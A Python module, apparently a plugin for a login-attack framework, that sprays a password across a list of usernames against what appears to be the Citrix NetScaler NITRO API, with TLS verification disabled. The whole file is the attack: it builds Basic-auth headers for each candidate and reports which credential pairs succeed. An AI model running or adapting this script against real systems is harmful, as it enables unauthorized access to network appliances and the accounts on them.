#! /usr/bin/python
#import the necessary libraries
from core.webModule import webModule
import base64
import requests
from requests import session

class citAPI(webModule):
    def __init__(self, config, display, lock):
        super(citAPI, self).__init__(config, display, lock)
        self.fingerprint="citAPI"
        self.response="Success"
    def appDetect(self, config, payload):
        print("Doing something cool...eventually...")
    def connectTest(self, config, payload):
        with session() as c:
            apiURL = config["HOST"] + "/nitro/v1/config"
            requests.packages.urllib3.disable_warnings()
            c.headers.update(payload)
            cget = c.get(apiURL, verify=False)
            if "Login Failure" in cget.text:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
            else:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                # Do something now!
                self.appDetect(config, payload)
    def payload(self, config):
                if config["UserFile"]:
                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                        for line in lines:
                            config["USERNAME"] = line.strip('\n')
                            creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
                            payload = {
                                'Authorization': 'Basic ' + creds
                                }
                            self.connectTest(config, payload)
                else:
                    creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
                    payload = {
                        'Authorization': 'Basic ' + creds
                        }
                    self.connectTest(config, payload)
